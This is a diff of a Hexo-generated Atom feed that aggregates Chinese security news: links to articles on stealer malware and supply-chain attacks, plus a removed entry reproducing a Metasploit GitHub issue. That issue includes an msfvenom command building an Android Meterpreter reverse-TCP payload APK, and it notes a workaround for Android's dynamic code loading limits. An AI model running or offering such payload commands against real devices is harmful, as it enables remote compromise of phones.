@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-09T10:45:45.947Z</updated>
+  <updated>2025-06-09T11:11:52.839Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,114 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>攻击者利用ClickFix诱骗苹果用户下载AMOS窃密软件</title>
+    <link href="http://example.com/2025/06/09/weixin_1292510401/"/>
+    <id>http://example.com/2025/06/09/weixin_1292510401/</id>
+    <published>2025-06-09T11:11:52.839Z</published>
+    <updated>2025-06-09T11:11:52.839Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/kUv0Ig7VBPhgRwObBc7TAQ">https://mp.weixin.qq.com/s/kUv0Ig7VBPhgRwObBc7TAQ</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/kUv0Ig7VBPhgRwObBc7TAQ&quot;&gt;https://mp.weixin.q</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>基于Rust语言的新型木马针对Chromium内核浏览器进行窃密</title>
+    <link href="http://example.com/2025/06/09/weixin_3637562339/"/>
+    <id>http://example.com/2025/06/09/weixin_3637562339/</id>
+    <published>2025-06-09T11:11:52.503Z</published>
+    <updated>2025-06-09T11:11:52.503Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/2nGkxJUfyu-W619JZMsTnA">https://mp.weixin.qq.com/s/2nGkxJUfyu-W619JZMsTnA</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/2nGkxJUfyu-W619JZMsTnA&quot;&gt;https://mp.weixin.q</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>蚂蚁集团“切面融合智能在威胁检测的应用”获评BCS2025中国网络安全优秀案例</title>
+    <link href="http://example.com/2025/06/09/weixin_404860143/"/>
+    <id>http://example.com/2025/06/09/weixin_404860143/</id>
+    <published>2025-06-09T11:11:52.174Z</published>
+    <updated>2025-06-09T11:11:52.171Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/W4tbnPpNGrRA_6i5MStNvA">https://mp.weixin.qq.com/s/W4tbnPpNGrRA_6i5MStNvA</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/W4tbnPpNGrRA_6i5MStNvA&quot;&gt;https://mp.weixin.q</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>新型供应链恶意软件攻击npm和PyPI生态系统，百万用户面临风险</title>
+    <link href="http://example.com/2025/06/09/weixin_112110485/"/>
+    <id>http://example.com/2025/06/09/weixin_112110485/</id>
+    <published>2025-06-09T11:11:51.306Z</published>
+    <updated>2025-06-09T11:11:51.303Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/_PVbEikIzNW2tNFFzP1vAA">https://mp.weixin.qq.com/s/_PVbEikIzNW2tNFFzP1vAA</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/_PVbEikIzNW2tNFFzP1vAA&quot;&gt;https://mp.weixin.q</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
+    
+  </entry>
   
   <entry>
     <title>CVE-2023-20198</title>
@@ -471,115 +579,6 @@
     <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
     
     <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>思考的幻觉：通过问题复杂性的视角理解推理模型的优势和局限性</title>
-    <link href="http://example.com/2025/06/09/weixin_1826130883/"/>
-    <id>http://example.com/2025/06/09/weixin_1826130883/</id>
-    <published>2025-06-09T06:08:31.853Z</published>
-    <updated>2025-06-09T06:08:31.848Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/XU-zqBX8ITj09cl5IAUMPQ">https://mp.weixin.qq.com/s/XU-zqBX8ITj09cl5IAUMPQ</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/XU-zqBX8ITj09cl5IAUMPQ&quot;&gt;https://mp.weixin.qq.c</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>付费近期暗网 0day 售卖预警</title>
-    <link href="http://example.com/2025/06/09/weixin_2415514355/"/>
-    <id>http://example.com/2025/06/09/weixin_2415514355/</id>
-    <published>2025-06-09T06:08:30.843Z</published>
-    <updated>2025-06-09T08:44:15.533Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/xXmbHwfOfGxQosOAxakaow">https://mp.weixin.qq.com/s/xXmbHwfOfGxQosOAxakaow</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/xXmbHwfOfGxQosOAxakaow&quot;&gt;https://mp.weixin.qq.c</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>《政务数据共享条例》解读：以数据安全为基石，推进政务数据共享创新</title>
-    <link href="http://example.com/2025/06/09/weixin_267285597/"/>
-    <id>http://example.com/2025/06/09/weixin_267285597/</id>
-    <published>2025-06-09T05:19:15.572Z</published>
-    <updated>2025-06-09T05:19:15.565Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 安恒信息CERT</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/g1snpzlE6uGOX3GykkMbmA">https://mp.weixin.qq.com/s/g1snpzlE6uGOX3GykkMbmA</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 安恒信息CERT&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/g1snpzlE6uGOX3GykkMbmA&quot;&gt;https://mp.weixin.</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="安恒信息CERT" scheme="http://example.com/tags/%E5%AE%89%E6%81%92%E4%BF%A1%E6%81%AFCERT/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Android Dynamic Code Loading Restriction Vulnerability</title>
-    <link href="http://example.com/2025/06/09/github_51786075/"/>
-    <id>http://example.com/2025/06/09/github_51786075/</id>
-    <published>2025-06-09T04:00:17.267Z</published>
-    <updated>2025-06-09T04:00:17.267Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Android Dynamic Code Loading Restriction Vulnerability</p><p><strong>漏洞类型：</strong> 权限绕过</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 在Android 15（SDK 35）上，使用Pixel 6手机创建并运行一个恶意的.apk文件时，由于Android 14引入的动态代码加载限制，导致Meterpreter会话在阶段发送后失败。这表明存在一个权限绕过问题，可能通过<code>File.setReadOnly()</code>进行向后兼容的修复。</p><p><strong>产品厂商：</strong> Google</p><p><strong>产品名称：</strong> Android</p><p><strong>影响版本：</strong> 15 (SDK 35)</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/issues/20294">https://github.com/rapid7/metasploit-framework/issues/20294</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h2 id="Steps-to-reproduce"><a href="#Steps-to-reproduce" class="headerlink" title="Steps to reproduce"></a>Steps to reproduce</h2><p>Using a Pixel 6 phone running Android 15 (SDK 35).<br>Created a payload .apk with </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p android/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=10.129.114.9 <span class="hljs-attribute">LPORT</span>=4444 -o evil.apk<br></code></pre></td></tr></table></figure><p>I expect this is due to restrictions around dynamic code loading added in Android 14 (<a href="https://developer.android.com/about/versions/14/behavior-changes-14?utm_source=chatgpt.com#safer-dynamic-code-loading">https://developer.android.com/about/versions/14/behavior-changes-14?utm_source=chatgpt.com#safer-dynamic-code-loading</a>). I think there is an easy backwards-compatible fix with <code>File.setReadOnly()</code> so I will try to send a PR.</p><h2 id="Expected-behavior"><a href="#Expected-behavior" class="headerlink" title="Expected behavior"></a>Expected behavior</h2><p>Stage sends &#x2F; is run successfully and full Meterpreter session is opened.</p><h2 id="Current-behavior"><a href="#Current-behavior" class="headerlink" title="Current behavior"></a>Current behavior</h2><p>Phone logs showing code loading error:<br><img src="https://github.com/user-attachments/assets/c3203ba0-305b-4ec0-8633-639c642c4d31" alt="Image"><br>Sessions are opening but fail when stage times out:<br><img src="https://github.com/user-attachments/assets/bd0d1aff-dbc7-49c0-97fd-6d8c2970dad8" alt="Image"></p><h3 id="Metasploit-version"><a href="#Metasploit-version" class="headerlink" title="Metasploit version"></a>Metasploit version</h3><p>Framework: 6.4.55-dev-<br>Console  : 6.4.55-dev-</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Android Dynamic Code Loading Restriction Vulnerability&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞类型：&lt;/strong&gt; 权限绕过&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞等级：&lt;/st</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
-    
-    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
     
   </entry>
   
